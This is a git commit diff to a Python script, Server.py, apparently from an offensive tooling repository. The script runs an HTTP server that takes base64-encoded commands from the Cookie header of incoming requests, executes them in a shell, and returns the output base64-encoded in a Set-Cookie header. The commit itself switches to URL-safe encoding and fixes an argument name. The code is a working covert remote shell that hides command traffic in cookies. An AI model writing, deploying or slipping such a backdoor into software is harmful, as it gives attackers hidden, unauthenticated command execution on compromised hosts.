7cf935ceb9716f29767f18a8742294d0aa7b0a90
MaxJackson13 <72030655+MaxJackson13@users.noreply.github.com>
2022-11-24 23:09:22 +0000

    Update Server.py

--- Server.py
+++ Server.py
@@ -1,6 +1,6 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import subprocess
-from base64 import b64encode, b64decode
+from base64 import urlsafe_b64encode, urlsafe_b64decode
 import argparse
 
 parser = argparse.ArgumentParser()
@@ -8,17 +8,17 @@ parser.add_argument('-s', '--serverip', required=True, help = 'Enter your IP add
 parser.add_argument('-p', '--port', default=8000, type=int, help = 'Specify the port to serve on')
 options = parser.parse_args()
 
-host = options.host
+host = options.serverip
 port = options.port
 
 class serve(BaseHTTPRequestHandler):
     
     def do_GET(self):          
         if self.path != '/favicon.ico':
-            encoded_command = self.headers['Cookie'].split('=')[-1]
-            command = b64decode(encoded_command.encode()).decode()
+            encoded_command = self.headers['Cookie'].split('Cookie')[1][1:]
+            command = urlsafe_b64decode(encoded_command.encode()).decode()
             output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0]
-            encoded_output = b64encode(bytes(output)).decode()
+            encoded_output = urlsafe_b64encode(bytes(output)).decode()
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.send_header("Set-Cookie", encoded_output)
